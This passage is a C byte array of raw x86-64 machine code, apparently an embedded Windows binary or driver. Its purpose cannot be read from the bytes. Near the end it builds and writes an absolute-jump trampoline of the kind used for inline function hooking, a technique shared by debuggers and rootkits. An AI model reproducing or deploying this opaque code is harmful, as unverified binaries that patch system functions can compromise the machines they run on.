    0xCD, 0x31, 0xC0, 0x41, 0x83, 0xF8, 0x01, 0xB9, 0xFF, 0xFF, 0x1F, 0x00, 0x41, 0xB8, 0xFF, 0x0F,
    0x00, 0x00, 0x4C, 0x0F, 0x44, 0xC1, 0x0F, 0x94, 0xC0, 0x83, 0xFE, 0x02, 0xBB, 0xFF, 0xFF, 0xFF,
    0x3F, 0x49, 0x0F, 0x45, 0xD8, 0x8D, 0x44, 0xC0, 0x0C, 0x49, 0x89, 0xD8, 0xB9, 0x1E, 0x00, 0x00,
    0x00, 0x0F, 0x45, 0xC8, 0x49, 0xF7, 0xD0, 0x48, 0x01, 0xD3, 0x4C, 0x21, 0xC3, 0x48, 0xD3, 0xEB,
    0x48, 0x8B, 0x3D, 0xD9, 0x93, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xE8, 0x81, 0x31, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x0F, 0x84, 0xF4, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x48, 0x8D, 0x54, 0x24, 0x2C,
    0x4C, 0x8D, 0x44, 0x24, 0x28, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x31, 0xC9, 0xE8, 0x0F, 0x2C, 0x00,
    0x00, 0x8B, 0x54, 0x24, 0x28, 0x8B, 0x4C, 0x24, 0x2C, 0x4C, 0x8D, 0x05, 0xFD, 0x80, 0x00, 0x00,
    0xE8, 0xEB, 0x3B, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0xDC, 0x00, 0x00, 0x00, 0x89, 0xE8, 0x48,
    0x31, 0xF8, 0x44, 0x8B, 0x4C, 0x24, 0x28, 0x44, 0x8B, 0x44, 0x24, 0x2C, 0x48, 0x89, 0x44, 0x24,
    0x20, 0x48, 0x8D, 0x4C, 0x24, 0x3C, 0x4C, 0x89, 0xF2, 0xE8, 0xF2, 0x29, 0x00, 0x00, 0x80, 0x7C,
    0x24, 0x44, 0x00, 0x0F, 0x84, 0xC3, 0x00, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x3C, 0x31, 0xD2, 0x41,
    0x89, 0xF0, 0xE8, 0xF9, 0x2B, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x83, 0xFE, 0x01, 0x48, 0x8D, 0x05,
    0xBD, 0x7E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xBA, 0x7E, 0x00, 0x00, 0x48, 0x0F, 0x44, 0xC8, 0x83,
    0xFE, 0x02, 0x48, 0x8D, 0x05, 0xB0, 0x7E, 0x00, 0x00, 0x48, 0x0F, 0x45, 0xC1, 0x48, 0x89, 0x44,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0x47, 0x65, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC4, 0x7D, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x4C, 0x72, 0x00, 0x00, 0x4D, 0x89, 0xF9, 0xFF, 0x15, 0x88, 0x92, 0x00, 0x00,
    0x4C, 0x89, 0xF1, 0x4C, 0x89, 0xFA, 0x49, 0x89, 0xD8, 0x41, 0x89, 0xF1, 0xE8, 0x4F, 0x0E, 0x00,
    0x00, 0x85, 0xC0, 0x0F, 0x88, 0x86, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x7C, 0x50, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x7F, 0x7D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x15, 0x72, 0x00, 0x00, 0x4D, 0x89,
    0xF9, 0xFF, 0x15, 0x51, 0x92, 0x00, 0x00, 0xE9, 0x97, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xCC,
    0x6E, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x64, 0x7D, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF2, 0x71, 0x00,
    0x00, 0xFF, 0x15, 0x31, 0x92, 0x00, 0x00, 0xEB, 0x77, 0x48, 0x89, 0xF9, 0xE8, 0xEF, 0x3A, 0x00,
    0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0x36, 0x91, 0x00, 0x00, 0xEB, 0x64, 0x48, 0x89, 0xF9, 0xE8,
    0xDC, 0x3A, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0x23, 0x91, 0x00, 0x00, 0x4C, 0x8B, 0x4C,
    0x24, 0x30, 0x48, 0x8D, 0x0D, 0xD9, 0x72, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x1E, 0x7D, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xAC, 0x71, 0x00, 0x00, 0xFF, 0x15, 0xEB, 0x91, 0x00, 0x00, 0xEB, 0x31, 0x89,
    0xC6, 0x48, 0x89, 0xF9, 0xE8, 0xA7, 0x3A, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0xEE, 0x90,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0xAA, 0x79, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEE, 0x7C, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x7C, 0x71, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0xB8, 0x91, 0x00, 0x00,
    0x45, 0x31, 0xFF, 0x4C, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x48, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5E,
    0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x89, 0xCE, 0x31, 0xC9, 0xB8,
    0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x4A, 0x30, 0x75, 0x26, 0x48, 0x89, 0xD7, 0x48, 0xC7,
    0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x28, 0xFF, 0x15,
    0x34, 0x90, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x35, 0x48, 0x8D, 0x0D, 0xAE, 0x75, 0x00, 0x00, 0xEB,
    0x07, 0x48, 0x8D, 0x0D, 0x90, 0x5C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6F, 0x7C, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0xB6, 0x70, 0x00, 0x00, 0xFF, 0x15, 0x3C, 0x91, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00,
    0xC0, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0x5F, 0x5E, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x48, 0x8B, 0x5C,
    0x24, 0x28, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x32, 0x68, 0x00, 0x00, 0x4C, 0x8D, 0x35, 0x3B, 0x7C, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0xE7, 0x6C, 0x00, 0x00, 0x4C, 0x8D, 0x3D, 0xED, 0x7C, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x4D,
    0x89, 0xF9, 0xFF, 0x15, 0xF0, 0x90, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x0D,
    0x04, 0x8A, 0x00, 0x00, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x87, 0x14, 0x01, 0x48, 0x8D, 0x0D, 0x3C,
    0x71, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEC, 0x7B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x3B, 0x70, 0x00,
    0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0xBE, 0x90, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48,
    0x8D, 0x0D, 0x9D, 0x67, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x8E, 0x6C, 0x00, 0x00, 0x4C, 0x89, 0xF2,
    0x4D, 0x89, 0xF9, 0xFF, 0x15, 0x9F, 0x90, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF, 0x15, 0xAE, 0x8F,
    0x00, 0x00, 0xEB, 0x2C, 0x48, 0x8B, 0x05, 0xAD, 0x89, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x10, 0x48,
    0x87, 0x08, 0x48, 0x8D, 0x0D, 0xE6, 0x70, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x96, 0x7B, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xE5, 0x6F, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0x15, 0x68, 0x90, 0x00, 0x00,
    0x31, 0xC0, 0xE9, 0x2A, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x89, 0xCF, 0x31,
    0xC9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x4A, 0x30, 0x75, 0x3E, 0x48, 0x89, 0xD3,
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x89, 0xF9, 0x48, 0x8D, 0x54, 0x24, 0x30,
    0xFF, 0x15, 0xF2, 0x8E, 0x00, 0x00, 0x85, 0xC0, 0x40, 0x0F, 0x94, 0xC6, 0x74, 0x4A, 0x48, 0x8D,
    0x0D, 0x68, 0x74, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x32, 0x7B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD7,
    0x6F, 0x00, 0x00, 0xFF, 0x15, 0xFF, 0x8F, 0x00, 0x00, 0xEB, 0x1D, 0x48, 0x8D, 0x0D, 0x36, 0x5B,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x15, 0x7B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xBA, 0x6F, 0x00, 0x00,
    0xFF, 0x15, 0xE2, 0x8F, 0x00, 0x00, 0x31, 0xF6, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x38, 0x5B, 0x5F,
    0x5E, 0x41, 0x5C, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x4C, 0x8B, 0x74, 0x24, 0x30, 0x4D, 0x85, 0xF6,
    0x0F, 0x84, 0x8B, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xD7, 0x66,
    0x00, 0x00, 0x4C, 0x8D, 0x3D, 0xE0, 0x7A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x8C, 0x6B, 0x00, 0x00,
    0x4C, 0x8D, 0x25, 0x92, 0x7B, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x95,
    0x8F, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x0D, 0xA9, 0x88, 0x00, 0x00, 0x48,
    0x8B, 0x13, 0x48, 0x87, 0x14, 0x01, 0x48, 0x8D, 0x0D, 0x0F, 0x70, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xA0, 0x7A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x3F, 0x6F, 0x00, 0x00, 0x41, 0x89, 0xF9, 0xFF, 0x15,
    0x64, 0x8F, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x43, 0x66, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x34, 0x6B, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x45,
    0x8F, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xFF, 0x15, 0x54, 0x8E, 0x00, 0x00, 0xE9, 0x57, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x05, 0x50, 0x88, 0x00, 0x00, 0x48, 0x8B, 0x0B, 0x48, 0x87, 0x08, 0x48, 0x8D,
    0x0D, 0xB7, 0x6F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x48, 0x7A, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE7,
    0x6E, 0x00, 0x00, 0x41, 0x89, 0xF9, 0xFF, 0x15, 0x0C, 0x8F, 0x00, 0x00, 0xE9, 0x27, 0xFF, 0xFF,
    0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x31, 0xC9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0,
    0x0F, 0xB1, 0x4E, 0x30, 0x48, 0x8B, 0x05, 0xDD, 0x8E, 0x00, 0x00, 0x0F, 0x85, 0xB1, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0xBE, 0x59, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xF5, 0x79, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x49, 0x59, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x4E, 0x18, 0x48, 0x85, 0xC9, 0x74,
    0x26, 0xBA, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0x6C, 0x8C, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x7E,
    0x6D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xCA, 0x79, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x1E, 0x59, 0x00,
    0x00, 0xFF, 0x15, 0x91, 0x8E, 0x00, 0x00, 0x48, 0x8B, 0x4E, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0B,
    0xBA, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0x3D, 0x8C, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x48, 0x85,
    0xC9, 0x74, 0x21, 0xFF, 0x15, 0x87, 0x8D, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x23, 0x79, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x8D, 0x79, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE1, 0x58, 0x00, 0x00, 0xFF, 0x15,
    0x54, 0x8E, 0x00, 0x00, 0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x31, 0xD2, 0xFF,
    0x15, 0x53, 0x8E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x18, 0x70, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x53,
    0x79, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB5, 0x58, 0x00, 0x00, 0xFF, 0x15, 0x28, 0x8E, 0x00, 0x00,
    0xEB, 0x17, 0x48, 0x8D, 0x0D, 0x5F, 0x59, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x3E, 0x79, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x98, 0x58, 0x00, 0x00, 0xFF, 0xD0, 0x90, 0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x31, 0xC9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1,
    0x0D, 0x9B, 0x8E, 0x00, 0x00, 0x0F, 0x85, 0x1A, 0x02, 0x00, 0x00, 0x48, 0x89, 0xD6, 0x39, 0x35,
    0x94, 0x8E, 0x00, 0x00, 0x0F, 0x85, 0x0B, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xD7, 0x8D, 0x00,
    0x00, 0x45, 0x84, 0xC0, 0x74, 0x1F, 0x48, 0x8D, 0x0D, 0xD8, 0x6F, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xF0, 0x78, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x36, 0x67, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0xD0,
    0xE9, 0xE0, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xD0, 0x6D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xD1,
    0x78, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x17, 0x67, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF, 0xD0, 0x31,
    0xC9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x0D, 0x32, 0x8E, 0x00, 0x00, 0x48, 0x8B,
    0x05, 0x83, 0x8D, 0x00, 0x00, 0x0F, 0x85, 0xBF, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x64, 0x58,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x9B, 0x78, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xEF, 0x57, 0x00, 0x00,
    0xFF, 0xD0, 0x48, 0x8B, 0x0D, 0xEF, 0x8D, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x26, 0xBA, 0x00,
    0x10, 0x00, 0x00, 0xFF, 0x15, 0x0F, 0x8B, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x21, 0x6C, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0x6D, 0x78, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC1, 0x57, 0x00, 0x00, 0xFF, 0x15,
    0x34, 0x8D, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xAD, 0x8D, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x0B,
    0xBA, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0xDD, 0x8A, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x8E, 0x8D,
    0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x21, 0xFF, 0x15, 0x23, 0x8C, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0xBF, 0x77, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x29, 0x78, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7D, 0x57,
    0x00, 0x00, 0xFF, 0x15, 0xF0, 0x8C, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x61, 0x8D, 0x00, 0x00, 0x41,
    0xB8, 0x40, 0x00, 0x00, 0x00, 0x31, 0xD2, 0xFF, 0x15, 0xEB, 0x8C, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0xB0, 0x6E, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEB, 0x77, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4D, 0x57,
    0x00, 0x00, 0xFF, 0x15, 0xC0, 0x8C, 0x00, 0x00, 0xEB, 0x17, 0x48, 0x8D, 0x0D, 0xF7, 0x57, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xD6, 0x77, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x30, 0x57, 0x00, 0x00, 0xFF,
    0xD0, 0x8B, 0x05, 0x89, 0x37, 0x04, 0x00, 0x85, 0xC0, 0x74, 0x2B, 0x31, 0xFF, 0x0F, 0x1F, 0x00,
    0x48, 0x8B, 0x05, 0x71, 0x37, 0x04, 0x00, 0x48, 0x8B, 0x0C, 0xF8, 0xBA, 0x00, 0x10, 0x00, 0x00,
    0xFF, 0x15, 0x42, 0x8A, 0x00, 0x00, 0x48, 0xFF, 0xC7, 0x8B, 0x05, 0x61, 0x37, 0x04, 0x00, 0x48,
    0x98, 0x48, 0x39, 0xC7, 0x72, 0xDA, 0x48, 0x8B, 0x0D, 0x4B, 0x37, 0x04, 0x00, 0x48, 0x85, 0xC9,
    0x74, 0x11, 0x48, 0x8B, 0x15, 0x4F, 0x37, 0x04, 0x00, 0x48, 0xC1, 0xE2, 0x03, 0xFF, 0x15, 0x15,
    0x8A, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xEE, 0x36, 0x04, 0x00, 0x41, 0xB8, 0x58, 0x00, 0x00, 0x00,
    0x31, 0xD2, 0xFF, 0x15, 0x50, 0x8C, 0x00, 0x00, 0xE8, 0x73, 0x1D, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0x1F, 0x48, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x59, 0x77, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xBC, 0x65,
    0x00, 0x00, 0xFF, 0x15, 0x20, 0x8C, 0x00, 0x00, 0x48, 0x83, 0x3D, 0x68, 0x37, 0x04, 0x00, 0x00,
    0x74, 0x25, 0x48, 0x8B, 0x0D, 0x57, 0x37, 0x04, 0x00, 0xB2, 0x01, 0xFF, 0x15, 0xC7, 0x8A, 0x00,
    0x00, 0x48, 0xC7, 0x05, 0x4C, 0x37, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x05, 0x39,
    0x37, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x78, 0x70, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x01, 0x77, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x55, 0x65, 0x00, 0x00, 0x41, 0x89, 0xF1, 0xFF,
    0x15, 0xD3, 0x8B, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C,
    0x8B, 0x25, 0x4A, 0x8A, 0x00, 0x00, 0x4D, 0x85, 0xE4, 0x0F, 0x84, 0x29, 0x01, 0x00, 0x00, 0x48,
    0x89, 0xCE, 0x4D, 0x8B, 0x2C, 0x24, 0x4D, 0x39, 0xE5, 0x0F, 0x84, 0xBE, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x3D, 0xBC, 0x80, 0x00, 0x00, 0x48, 0x8D, 0x1D, 0xCF, 0x80, 0x00, 0x00, 0x4C, 0x8D, 0x35,
    0x98, 0x80, 0x00, 0x00, 0x4C, 0x8D, 0x3D, 0x79, 0x80, 0x00, 0x00, 0xEB, 0x10, 0x0F, 0x1F, 0x00,
    0x4D, 0x8B, 0x6D, 0x00, 0x4D, 0x39, 0xE5, 0x0F, 0x84, 0x90, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x4D,
    0x60, 0x48, 0x85, 0xC9, 0x74, 0xEA, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0x89, 0x8B, 0x00, 0x00, 0x85,
    0xC0, 0x75, 0x0B, 0x41, 0xF6, 0x45, 0x68, 0x20, 0x0F, 0x85, 0x46, 0x01, 0x00, 0x00, 0x49, 0x8B,
    0x4D, 0x60, 0x48, 0x85, 0xC9, 0x74, 0xC9, 0x48, 0x89, 0xDA, 0xFF, 0x15, 0x68, 0x8B, 0x00, 0x00,
    0x85, 0xC0, 0x75, 0x0B, 0x41, 0xF6, 0x45, 0x68, 0x20, 0x0F, 0x85, 0x1D, 0x01, 0x00, 0x00, 0x49,
    0x8B, 0x4D, 0x60, 0x48, 0x85, 0xC9, 0x74, 0xA8, 0x4C, 0x89, 0xF2, 0xFF, 0x15, 0x47, 0x8B, 0x00,
    0x00, 0x85, 0xC0, 0x75, 0x0B, 0x41, 0xF6, 0x45, 0x68, 0x20, 0x0F, 0x85, 0x01, 0x01, 0x00, 0x00,
    0x49, 0x8B, 0x4D, 0x60, 0x48, 0x85, 0xC9, 0x74, 0x87, 0x4C, 0x89, 0xFA, 0xFF, 0x15, 0x26, 0x8B,
    0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0x76, 0xFF, 0xFF, 0xFF, 0x41, 0xF6, 0x45, 0x68, 0x20, 0x0F,
    0x84, 0x6B, 0xFF, 0xFF, 0xFF, 0x4C, 0x89, 0xFF, 0xE9, 0xD7, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x34,
    0x24, 0x4D, 0x39, 0xE6, 0x74, 0x5B, 0x48, 0x8D, 0x3D, 0x5D, 0x80, 0x00, 0x00, 0x48, 0x8D, 0x1D,
    0x46, 0x80, 0x00, 0x00, 0xEB, 0x19, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x41, 0xF6, 0x46, 0x68, 0x20, 0x75, 0x67, 0x4D, 0x8B, 0x36, 0x4D, 0x39, 0xE6, 0x74, 0x32, 0x49,
    0x8B, 0x4E, 0x60, 0x48, 0x85, 0xC9, 0x74, 0xE8, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xC7, 0x8A, 0x00,
    0x00, 0x85, 0xC0, 0x74, 0xE2, 0x49, 0x8B, 0x4E, 0x60, 0x48, 0x89, 0xDA, 0xFF, 0x15, 0xB6, 0x8A,
    0x00, 0x00, 0x85, 0xC0, 0x75, 0xCA, 0xEB, 0xCF, 0x48, 0x8D, 0x0D, 0xAE, 0x6B, 0x00, 0x00, 0xEB,
    0x07, 0x48, 0x8D, 0x0D, 0x7F, 0x5A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x8F, 0x75, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x4C, 0x5A, 0x00, 0x00, 0xFF, 0x15, 0x5C, 0x8A, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x83,
    0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x49, 0x8B,
    0x46, 0x60, 0x48, 0x85, 0xC0, 0x4C, 0x8D, 0x0D, 0x08, 0x80, 0x00, 0x00, 0x4C, 0x0F, 0x45, 0xC8,
    0x48, 0x8D, 0x0D, 0x1F, 0x57, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x56, 0x75, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x0D, 0x5A, 0x00, 0x00, 0xFF, 0x15, 0x1D, 0x8A, 0x00, 0x00, 0x48, 0x85, 0xF6, 0x74, 0x06,
    0x41, 0x8B, 0x46, 0x40, 0x89, 0x06, 0x49, 0x8B, 0x46, 0x30, 0xEB, 0xB2, 0x48, 0x89, 0xDF, 0xEB,
    0x03, 0x4C, 0x89, 0xF7, 0x48, 0x8D, 0x0D, 0x1F, 0x57, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x22, 0x75,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD9, 0x59, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0xE6, 0x89,
    0x00, 0x00, 0x48, 0x85, 0xF6, 0x74, 0x06, 0x41, 0x8B, 0x45, 0x40, 0x89, 0x06, 0x49, 0x8B, 0x45,
    0x30, 0xE9, 0x78, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x31, 0xF6, 0x31, 0xC0, 0xF0, 0x48, 0x0F, 0xB1, 0x35, 0xFD,
    0x34, 0x04, 0x00, 0x0F, 0x85, 0x48, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x24, 0x00, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x4C, 0x24, 0x24, 0xE8, 0xD5, 0xFD, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x0F, 0x84,
    0xE7, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x50, 0xC3, 0x48, 0xC7, 0x44, 0x24,
    0x28, 0x48, 0xB8, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0x11, 0x6F, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x41, 0xB9, 0x05, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xC1, 0xE8, 0xB9, 0x1C, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x85, 0xC0, 0x0F,
    0x84, 0xEC, 0x00, 0x00, 0x00, 0x4C, 0x63, 0x05, 0x54, 0x82, 0x00, 0x00, 0x8B, 0x54, 0x24, 0x20,
    0x48, 0x89, 0xC1, 0xE8, 0x18, 0x1B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xAC, 0x00, 0x00,
    0x00, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x05, 0x25, 0xFB, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x2A,
    0x4C, 0x63, 0x05, 0x29, 0x82, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x48, 0x89, 0xF9, 0xFF,
    0x15, 0x1B, 0x89, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x56, 0x5D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x31,
    0x74, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE2, 0x63, 0x00, 0x00, 0x49, 0x89, 0xF9, 0xFF, 0x15, 0xF5,
    0x88, 0x00, 0x00, 0x48, 0x63, 0x15, 0xF6, 0x81, 0x00, 0x00, 0x48, 0x89, 0xF9, 0x45, 0x31, 0xC0,
